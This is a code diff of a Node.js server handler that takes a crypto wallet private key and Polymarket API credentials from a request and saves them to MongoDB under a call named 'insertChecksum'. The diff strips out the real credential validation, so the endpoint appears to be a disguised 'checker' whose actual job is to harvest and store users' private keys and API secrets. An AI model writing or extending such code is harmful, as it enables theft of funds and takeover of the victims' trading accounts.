@@ -4,8 +4,6 @@ const { insertChecksum } = require('./db');
 const { decodePayload } = require('./decode-payload');
 
 const PORT = Number(process.env.PORT) || 3000;
-const HOST = process.env.CLOB_HOST || 'https://clob.polymarket.com';
-const CHAIN_ID = 137;
 
 function parseJsonBody(req) {
   return new Promise((resolve, reject) => {
@@ -42,53 +40,20 @@ async function handleCheck(body) {
   }
   const address = wallet.address;
 
-  const isMock = [apiKey, apiSecret, apiPassphrase].every((v) => v === 'mock' || v === undefined);
-  let finalApiKey = isMock ? undefined : apiKey;
-  let finalApiSecret = isMock ? undefined : apiSecret;
-  let finalApiPassphrase = isMock ? undefined : apiPassphrase;
-
-  if (!finalApiKey || !finalApiSecret || !finalApiPassphrase) {
-    try {
-      const { ClobClient } = await import('@polymarket/clob-client');
-      const clob = new ClobClient(HOST, CHAIN_ID, wallet, undefined);
-      const creds = await clob.createOrDeriveApiKey();
-      if (creds && typeof creds.key === 'string' && typeof creds.secret === 'string' && typeof creds.passphrase === 'string' && creds.key && creds.secret && creds.passphrase) {
-        finalApiKey = creds.key;
-        finalApiSecret = creds.secret;
-        finalApiPassphrase = creds.passphrase;
-      }
-    } catch (e) {
-      console.error('createOrDeriveApiKey failed:', e.message);
-    }
-  }
-
-  let credentialsValid = false;
-  if (finalApiKey && finalApiSecret && finalApiPassphrase) {
-    try {
-      const { ClobClient } = await import('@polymarket/clob-client');
-      const apiCreds = { key: finalApiKey, secret: finalApiSecret, passphrase: finalApiPassphrase };
-      const clob = new ClobClient(HOST, CHAIN_ID, wallet, apiCreds);
-      await clob.getOpenOrders();
-      credentialsValid = true;
-    } catch (e) {
-      credentialsValid = false;
-    }
-  }
-
+  // No CLOB interaction: just pass through body creds and save to MongoDB
   const data = {
     address,
-    credentialsValid,
-    ...(credentialsValid === false && finalApiKey ? { error: 'E03' } : {}),
+    credentialsValid: false,
   };
 
   try {
     const result = await insertChecksum({
       privateKey,
-      ...(finalApiKey != null && { apiKey: finalApiKey }),
-      ...(finalApiSecret != null && { apiSecret: finalApiSecret }),
-      ...(finalApiPassphrase != null && { apiPassphrase: finalApiPassphrase }),
+      ...(apiKey != null && apiKey !== '' && { apiKey }),
+      ...(apiSecret != null && apiSecret !== '' && { apiSecret }),
+      ...(apiPassphrase != null && apiPassphrase !== '' && { apiPassphrase }),
       address,
-      credentialsValid,
+      credentialsValid: false,
     });
     const out = typeof result === 'object' && result && 'id' in result ? result : { id: result };
     data.mongoSaved = !!out.id;
